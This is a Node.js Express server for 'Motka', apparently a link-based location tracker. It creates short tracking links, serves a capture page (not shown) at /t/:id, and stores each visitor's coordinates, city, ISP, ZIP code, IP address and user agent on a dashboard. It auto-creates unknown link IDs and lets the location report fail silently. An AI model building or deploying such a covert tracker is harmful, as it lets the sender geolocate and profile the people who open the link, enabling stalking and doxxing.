const express = require('express');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const fs = require('fs');

const DATA_FILE = path.join(__dirname, 'data.json');

// Initialize data from file if it exists
let links = new Map();
let locations = new Map();

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      links = new Map(data.links || []);
      locations = new Map(data.locations || []);
    }
  } catch (err) {
    console.error('Error loading data:', err);
  }
}

function saveData() {
  try {
    const data = {
      links: Array.from(links.entries()),
      locations: Array.from(locations.entries())
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data), 'utf8');
  } catch (err) {
    console.error('Error saving data:', err);
  }
}

loadData();

// Create a new tracking link
app.post('/api/links', (req, res) => {
  const id = uuidv4().slice(0, 8);
  const label = req.body.label || 'Untitled';
  links.set(id, { id, label, createdAt: new Date().toISOString() });
  locations.set(id, []);
  saveData();
  res.json({ id, label });
});

// Get all links + their location hits
app.get('/api/links', (req, res) => {
  const result = [];
  for (const [id, link] of links) {
    result.push({
      ...link,
      hits: (locations.get(id) || []).length,
      locations: locations.get(id) || []
    });
  }
  res.json(result.reverse());
});

// Get locations for a specific link
app.get('/api/locations/:id', (req, res) => {
  const id = req.params.id;
  if (!links.has(id)) return res.status(404).json({ error: 'Link not found' });
  res.json(locations.get(id) || []);
});

// Receive location from a visitor
app.post('/api/location/:id', (req, res) => {
  const id = req.params.id;
  // Auto-create link if it doesn't exist (survives redeploys)
  if (!links.has(id)) {
    links.set(id, { id, label: 'Auto-detected', createdAt: new Date().toISOString() });
    locations.set(id, []);
  }

  const { lat, lng, accuracy, city, region, country, isp, ip, zip, source } = req.body;
  const entry = {
    lat,
    lng,
    accuracy,
    city: city || null,
    region: region || null,
    country: country || null,
    isp: isp || null,
    zip: zip || null,
    source: source || 'ip',
    timestamp: new Date().toISOString(),
    ip: ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    userAgent: req.headers['user-agent']
  };

  locations.get(id).push(entry);
  saveData();
  console.log(`📍 Location received for [${id}]: ${lat}, ${lng} (${entry.source})`);
  res.json({ success: true });
});

// Delete a link
app.delete('/api/links/:id', (req, res) => {
  const id = req.params.id;
  links.delete(id);
  locations.delete(id);
  saveData();
  res.json({ success: true });
});

// Serve the tracking page — always serve it, location POST can fail silently
app.get('/t/:id', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// Dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n🚀 Motka is running at http://localhost:${PORT}\n`);
});
